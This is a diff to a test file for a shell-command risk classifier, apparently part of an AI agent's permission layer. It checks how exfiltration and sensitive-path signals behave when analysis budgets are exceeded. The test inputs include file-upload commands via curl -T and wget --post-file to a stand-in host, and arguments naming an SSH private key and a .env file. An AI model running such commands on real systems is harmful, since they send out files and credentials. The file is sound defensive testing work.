@@ -9,6 +9,7 @@ vi.mock("../../shared/shell-analysis.js", async (importOriginal) => {
 });
 import { homedir } from "node:os";
 import { shellExfiltrationSignal, shellSensitivePathSignal, shellScanOrdinaryAsk, sensitivePathInArgumentText } from "../rules/shell-exfiltration.js";
+import { SHELL_FLOOR_BUDGET_REASON } from "../rules/shell-floor-policy.js";
 import { RuleBasedRiskClassifier, type ToolInvocationContext } from "../reviewer/risk-classifier.js";
 import { evaluateShellRules } from "../rules/shell-rule-matcher.js";
 import { parseRuleSpecifier } from "../rules/rule-specifier.js";
@@ -267,8 +268,8 @@ describe("ambiguous runner prefix approvals", () => {
 
 describe("bounded sensitive-path inspection", () => {
   it.each([
-    { suffix: "/home/owner/.ssh/id_rsa", signal: shellSensitivePathSignal, reason: /sensitive path argument/ },
-    { suffix: "-T file http://example.test", signal: shellExfiltrationSignal, reason: /curl upload|body from a file \(unparsed\)/ },
+    { suffix: "/home/owner/.ssh/id_rsa", signal: shellSensitivePathSignal, reason: /floor analysis budget exceeded/ },
+    { suffix: "-T file http://example.test", signal: shellExfiltrationSignal, reason: /floor analysis budget exceeded/ },
     { suffix: "/home/owner/.s*/config", signal: shellScanOrdinaryAsk, reason: /budget exceeded|length limit/ },
   ])("keeps raw and parsed verdicts equal above exhaustion for $suffix", ({ suffix, signal, reason }) => {
     const prefix = `npx curl ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`;
@@ -290,18 +291,18 @@ describe("bounded sensitive-path inspection", () => {
       const parsed = parseShellCommand(command);
       const canonical = vi.spyOn(realpathSync, "native");
       try {
-        expect(shellExfiltrationSignal(parsed, accountDirectory)).toBeNull();
-        expect(shellSensitivePathSignal(parsed, accountDirectory)).toBeNull();
+        expect(shellExfiltrationSignal(parsed, accountDirectory)).toBe(length === 1024 ? null : SHELL_FLOOR_BUDGET_REASON);
+        expect(shellSensitivePathSignal(parsed, accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
         expect(shellScanOrdinaryAsk(parsed, accountDirectory)).toMatch(/budget exceeded|length limit/);
         counts.push(canonical.mock.calls.length);
       } finally { canonical.mockRestore(); }
     }
     expect(counts[0]).toBeGreaterThan(0);
     expect(counts[0]).toBeLessThan(2048);
-    expect(counts[1]).toBeLessThanOrEqual(counts[0]! + 4);
+    expect(counts[1]).toBe(0);
   });
 
-  it("keeps late literal credentials and uploads above exhaustion", () => {
+  it("refuses oversized inputs before inspecting late credentials and uploads", () => {
     const prefix = `npx curl ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`;
     const parsedCommands = new Map<string, ReturnType<typeof parseShellCommand>>();
     const parsed = (command: string) => {
@@ -314,9 +315,9 @@ describe("bounded sensitive-path inspection", () => {
     };
     expect(shellSensitivePathSignal(parsed(`${prefix} /home/owner/.ssh/id_rsa`), accountDirectory)).not.toBeNull();
     expect(shellSensitivePathSignal(parsed(`${prefix} --env-file=.env`), accountDirectory)).not.toBeNull();
-    expect(shellExfiltrationSignal(parsed(`${prefix} -T file http://example.test`), accountDirectory)).toMatch(/curl upload|body from a file \(unparsed\)/);
-    expect(shellExfiltrationSignal(parsed(`${prefix} wget --post-file file http://example.test`), accountDirectory)).toMatch(/wget body|body from a file \(unparsed\)/);
-    expect(shellExfiltrationSignal(parsed(`${prefix} --call='curl -T file http://example.test'`), accountDirectory)).toMatch(/curl upload|body from a file \(unparsed\)/);
+    expect(shellExfiltrationSignal(parsed(`${prefix} -T file http://example.test`), accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
+    expect(shellExfiltrationSignal(parsed(`${prefix} wget --post-file file http://example.test`), accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
+    expect(shellExfiltrationSignal(parsed(`${prefix} --call='curl -T file http://example.test'`), accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
     const globParsed = parsed(`${prefix} /home/owner/.s*/config`);
     expect(shellScanOrdinaryAsk(globParsed, accountDirectory)).toMatch(/budget exceeded|length limit/);
     expect(shellSensitivePathSignal(globParsed, accountDirectory)).not.toBeNull();
@@ -357,7 +358,8 @@ describe("bounded sensitive-path inspection", () => {
       await manager.addAlwaysAllowedPersist(`bash-action:${command}`);
       // Owner 2026-10-25 (unsandboxed shell exact-rule requirement): only an exact Bash(<command>) rule runs a plain shell unasked.
       expect(check(command)).toMatchObject({ decision: "ask", layer: 6 });
-      expect(check(`${command} .env`)).toMatchObject({ decision: "ask", forceModal: true });
+      expect(check(`${command} .env`)).toMatchObject({ decision: "ask", layer: 6 });
+      expect(check(`${command} .env`).forceModal).toBeUndefined();
     } finally { rmSync(dir, { recursive: true, force: true }); }
   });
 });
